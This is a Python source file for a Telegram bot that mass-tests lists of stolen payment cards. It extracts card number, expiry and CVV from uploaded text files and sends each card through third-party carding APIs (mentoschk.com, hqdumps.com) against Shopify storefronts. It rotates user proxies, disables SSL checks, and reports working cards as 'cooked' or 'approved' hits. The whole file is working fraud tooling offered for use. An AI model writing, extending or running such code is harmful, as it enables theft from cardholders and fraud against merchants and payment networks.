import os
import re
import time
import random
import requests
import urllib3
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# 1. HELPER FUNCTIONS
# ============================================================================

def get_flag_emoji(country_code):
    """Convert country code to flag emoji"""
    if not country_code or len(country_code) != 2:
        return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

def get_bin_info(card_number):
    """Fetch BIN information"""
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    
    # Try antipublic API
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass
        
    return {
        'country_name': 'Unknown',
        'country_flag': '🇺🇳',
        'bank': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN'
    }

def extract_cards_from_text(text):
    """Extract cards in format CC|MM|YYYY|CVV from text"""
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15:
            continue
        # Regex to find CC patterns
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def create_progress_bar(processed, total, length=15):
    """Create a text progress bar"""
    if total == 0:
        return ""
    percent = processed / total
    filled_length = int(length * percent)
    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"

# ============================================================================
# 2. SHOPIFY CHECKER LOGIC
# ============================================================================
def check_site_shopify_direct(site_url, cc, proxy=None):
    import urllib.parse
    
    # Inner function to call APIs
    def call_api(api_base):
        try:
            clean_site = site_url.rstrip('/')
            
            # Format Proxy
            api_proxy = ""
            if proxy:
                proxy_str = proxy.strip()
                parts = proxy_str.split(':')
                if len(parts) == 4:
                    api_proxy = f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}" # user:pass@ip:port format often required
                else:
                    api_proxy = proxy_str # Assume IP:Port

            encoded_cc = urllib.parse.quote(cc)
            encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""

            if api_base == "mentoschk":
                url = f"http://mentoschk.com/shopify?site={clean_site}&cc={encoded_cc}"
                if encoded_proxy: url += f"&proxy={encoded_proxy}"
            else: # hqdumps
                api_key = "techshopify"
                url = f"https://hqdumps.com/autoshopify/index.php?key={api_key}&url={clean_site}&cc={encoded_cc}"
                if encoded_proxy: url += f"&proxy={encoded_proxy}"

            session = requests.Session()
            session.verify = False
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            # Increased timeout to prevent premature 400/500s
            response = session.get(url, headers=headers, timeout=60)

            if response.status_code != 200:
                return None

            data = response.json()
            
            # Normalize response structure
            if api_base == "mentoschk":
                return {
                    'Response': data.get('Response', 'Unknown'),
                    'Price': str(data.get('Price', '0.00')),
                    'Gateway': data.get('Gateway', 'Shopify API'),
                    'Status': data.get('Status', False)
                }
            else:
                resp_text = data.get('Response', 'Unknown')
                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
                return {
                    'Response': resp_text,
                    'Price': str(data.get('Price', '0.00')),
                    'Gateway': data.get('Gate', 'Shopify API'),
                    'Status': status
                }
        except Exception:
            return None

    # Try Primary API
    result = call_api("mentoschk")

    # Retry with Secondary if failed
    if result is None:
        result = call_api("hqdumps")
    
    if result is None:
        return {'Response': 'API Connection Error', 'status': 'ERROR', 'gateway': 'Shopify', 'price': '0.00'}

    # Process Result
    response_text = result['Response']
    price = result['Price']
    gateway = result['Gateway']
    
    response_upper = response_text.upper()
    
    # Mapping Logic
    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
    declined_keywords = ['DECLINED', 'DO NOT HONOR', 'PICKUP', 'STOLEN', 'LOST', 'INVALID', 'INCORRECT']
    
    if any(k in response_upper for k in approved_keywords):
        status = 'APPROVED'
    elif any(k in response_upper for k in approved_otp_keywords):
        status = 'APPROVED_OTP'
    elif any(k in response_upper for k in declined_keywords):
        status = 'DECLINED'
    else:
        status = 'DECLINED' # Default fallback
        
    return {
        'Response': response_text,
        'status': status,
        'gateway': gateway,
        'price': price
    }

# ============================================================================
# 3. MAIN HANDLER SETUP
# ============================================================================
def setup_complete_handler(
    bot,
    get_filtered_sites_func,
    proxies_data,
    check_site_func,
    is_valid_response_func,
    process_response_func,
    update_stats_func,
    save_json_func,
    is_user_allowed_func,
    OWNER_ID,
    DARKS_ID,
    user_proxies_store,
    USER_PROXIES_FILE
):
    
    # Use internal checker if none provided
    if check_site_func is None:
        check_site_func = check_site_shopify_direct

    # --- FIX: Robust User Auth Check ---
    def user_allowed(uid):
        try:
            # Check Owner (Integer list)
            if int(uid) in OWNER_ID:
                return True
            # Check Database (Function usually expects String or Int, let's pass both logic)
            return is_user_allowed_func(uid) or is_user_allowed_func(str(uid))
        except:
            return False

    # ------------------------------------------------------------------------
    # Proxy Management
    # ------------------------------------------------------------------------
    @bot.message_handler(commands=['addproxy'])
    def cmd_addproxy(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
            
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /addproxy ip:port OR ip:port:user:pass")
            return
            
        proxy = args[1].strip()
        uid = str(message.from_user.id)
        
        if uid not in user_proxies_store:
            user_proxies_store[uid] = []
            
        if proxy not in user_proxies_store[uid]:
            user_proxies_store[uid].append(proxy)
            save_json_func(USER_PROXIES_FILE, user_proxies_store)
            bot.reply_to(message, f"✅ Proxy added. Total: {len(user_proxies_store[uid])}")
        else:
            bot.reply_to(message, "⚠️ Proxy already in your list.")

    @bot.message_handler(commands=['myproxies'])
    def cmd_myproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        proxies = user_proxies_store.get(uid, [])
        if not proxies:
            bot.reply_to(message, "📭 You have no saved proxies.")
            return
        
        # Send as file if too long
        if len(proxies) > 10:
             with open("my_proxies.txt", "w") as f:
                 f.write("\n".join(proxies))
             with open("my_proxies.txt", "rb") as f:
                 bot.send_document(message.chat.id, f, caption=f"🔌 Your {len(proxies)} Proxies")
             os.remove("my_proxies.txt")
        else:
            proxy_list = "\n".join([f"• <code>{p}</code>" for p in proxies])
            bot.reply_to(message, f"🔌 <b>Your Proxies:</b>\n{proxy_list}", parse_mode='HTML')

    @bot.message_handler(commands=['clearproxies'])
    def cmd_clearproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        if uid in user_proxies_store:
            user_proxies_store[uid] = []
            save_json_func(USER_PROXIES_FILE, user_proxies_store)
            bot.reply_to(message, "✅ All your proxies cleared.")
        else:
            bot.reply_to(message, "📭 Nothing to clear.")

    # ------------------------------------------------------------------------
    # FILE UPLOAD HANDLER (Fixed Error 400 & Auth)
    # ------------------------------------------------------------------------
    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        # 1. Auth Check First
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            # --- FIX ERROR 400: Use safe reply logic ---
            try:
                msg_loading = bot.reply_to(message, "⏳ <b>Reading File...</b>", parse_mode='HTML')
            except Exception:
                # If reply fails (e.g. user deleted message), send a fresh message
                msg_loading = bot.send_message(message.chat.id, "⏳ <b>Reading File...</b>", parse_mode='HTML')

            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if ccs:
                # Initialize session storage if needed
                if not hasattr(bot, 'user_sessions'):
                    bot.user_sessions = {}
                
                # Store cards in session
                user_id = message.from_user.id
                bot.user_sessions[user_id] = {'ccs': ccs}

                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton("🛍️ Shopify Mass", callback_data="run_mass_shopify"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                )

                bot.edit_message_text(
                    f"📂 <b>File:</b> <code>{file_name}</code>\n"
                    f"💳 <b>Cards Found:</b> {len(ccs)}\n"
                    f"<b>⚡ Select Checker:</b>",
                    message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                )
            else:
                # Check for proxies
                proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                if proxies:
                    uid = str(message.from_user.id)
                    if uid not in user_proxies_store:
                        user_proxies_store[uid] = []
                    
                    added = 0
                    for p in proxies:
                        if p not in user_proxies_store[uid]:
                            user_proxies_store[uid].append(p)
                            added += 1
                    
                    if added > 0:
                        save_json_func(USER_PROXIES_FILE, user_proxies_store)
                    
                    bot.edit_message_text(
                        f"🔌 <b>Proxies Loaded:</b> {added} new.\nTotal: {len(user_proxies_store[uid])}",
                        message.chat.id, msg_loading.message_id, parse_mode='HTML'
                    )
                else:
                    bot.edit_message_text("❌ No valid Cards or Proxies found.", message.chat.id, msg_loading.message_id)

        except Exception as e:
            # Fallback error message
            try:
                bot.send_message(message.chat.id, f"❌ Error: {e}")
            except: pass

    # ------------------------------------------------------------------------
    # Mass Check Logic
    # ------------------------------------------------------------------------
    
    # Helper: Get Active Proxies
    def get_active_proxies_for_user(user_id):
        uid = str(user_id)
        proxy_list = user_proxies_store.get(uid, [])
        
        # Fallback to global proxies if owner
        if not proxy_list and int(user_id) in OWNER_ID:
            proxy_list = proxies_data.get('proxies', [])

        if not proxy_list:
            return None
        return proxy_list

    # 1. Filter Selection
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify_filter(call):
        try:
            # Safe delete
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return

            if not hasattr(bot, 'user_sessions') or user_id not in bot.user_sessions or 'ccs' not in bot.user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies_for_user(user_id)
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 <b>No Proxies Found!</b>\nPlease upload proxies first.", parse_mode='HTML')
                return

            # Store temp proxies for this run
            bot.user_sessions[user_id]['temp_proxies'] = proxies

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_filter_cooked"),
                types.InlineKeyboardButton("✅ Approved Only", callback_data="shopify_filter_approved"),
                types.InlineKeyboardButton("Both", callback_data="shopify_filter_both")
            )
            bot.send_message(call.message.chat.id, "🔍 <b>Select Hit Display:</b>", reply_markup=markup, parse_mode='HTML')

        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # 2. Start Mass Check
    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_filter_"))
    def callback_start_shopify_mass(call):
        try:
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            
            filter_choice = call.data.replace("shopify_filter_", "")
            user_id = call.from_user.id
            
            if not hasattr(bot, 'user_sessions') or user_id not in bot.user_sessions:
                bot.send_message(call.message.chat.id, "⚠️ Session expired.")
                return

            ccs = bot.user_sessions[user_id]['ccs']
            proxies = bot.user_sessions[user_id]['temp_proxies']
            sites = get_filtered_sites_func()
            
            if not sites:
                 bot.send_message(call.message.chat.id, "❌ No sites available in database.")
                 return

            start_msg = bot.send_message(
                call.message.chat.id,
                f"🔥 <b>Shopify Mass Check Started</b>\n"
                f"💳 Cards: {len(ccs)}\n"
                f"🔌 Proxies: {len(proxies)}\n"
                f"🎯 Filter: {filter_choice.upper()}",
                parse_mode='HTML'
            )

            # Start the heavy processing
            process_mass_check_engine(
                bot, call.message, start_msg,
                ccs, sites, proxies,
                check_site_func,
                hit_filter=filter_choice
            )
            
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # 3. Mass Check Engine (Optimized)
    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_func, hit_filter='both'):
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
        total = len(ccs)
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        def worker(cc):
            # Simple retry logic
            for _ in range(2): 
                try:
                    site = random.choice(sites)
                    proxy = random.choice(proxies)
                    res = check_func(site['url'], cc, proxy)
                    
                    if not res: continue
                    
                    # Return formatted result
                    return {
                        'cc': cc,
                        'status': res['status'],
                        'response': res['Response'],
                        'gateway': res['gateway'],
                        'price': res['price'],
                        'site_url': site['url']
                    }
                except:
                    continue
            return {'cc': cc, 'status': 'ERROR', 'response': 'Timeout/Dead', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}

        # Send Hit Helper
        def send_hit(res, title):
            try:
                msg = (
                    f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃   {title} HIT!\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"💳 <code>{res['cc']}</code>\n"
                    f"📟 {res['response']}\n"
                    f"💰 ${res['price']} | {res['gateway']}\n"
                    f"🌐 {res['site_url']}\n"
                    f"👤 <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
                )
                bot.send_message(message.chat.id, msg, parse_mode='HTML')
            except: pass

        # Execution Loop
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(worker, cc): cc for cc in ccs}
            for future in as_completed(futures):
                processed += 1
                res = future.result()
                status = res['status']

                # Stats Update
                if status == 'APPROVED':
                    results['cooked'].append(res)
                    update_stats_func('COOKED', True)
                    if hit_filter in ['cooked', 'both']:
                        send_hit(res, "🔥 COOKED")
                elif status == 'APPROVED_OTP':
                    results['approved'].append(res)
                    update_stats_func('APPROVED', True)
                    if hit_filter in ['approved', 'both']:
                        send_hit(res, "✅ APPROVED")
                elif status == 'DECLINED':
                    results['declined'].append(res)
                    update_stats_func('DECLINED', True)
                else:
                    results['error'].append(res)

                # UI Update (Throttled to every 3 seconds)
                if time.time() - last_update_time > 3 or processed == total:
                    try:
                        bot.edit_message_text(
                            f"┏━━━━━━━⍟\n┃ <b>⚡ MASS CHECKING...</b>\n┗━━━━━━━━━━━⊛\n"
                            f"{create_progress_bar(processed, total)}\n"
                            f"<b>Progress:</b> {processed}/{total}\n\n"
                            f"🔥 <b>Cooked:</b> {len(results['cooked'])}\n"
                            f"✅ <b>Approved:</b> {len(results['approved'])}\n"
                            f"❌ <b>Declined:</b> {len(results['declined'])}",
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                        last_update_time = time.time()
                    except: pass

        # Final Message
        duration = time.time() - start_time
        try:
            bot.send_message(
                message.chat.id,
                f"✅ <b>Check Completed!</b>\n"
                f"Total: {total} | Time: {duration:.2f}s\n"
                f"🔥 Cooked: {len(results['cooked'])}\n"
                f"✅ Approved: {len(results['approved'])}",
                parse_mode='HTML'
            )
        except: pass

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ Cancelled.")
        except: pass

    return
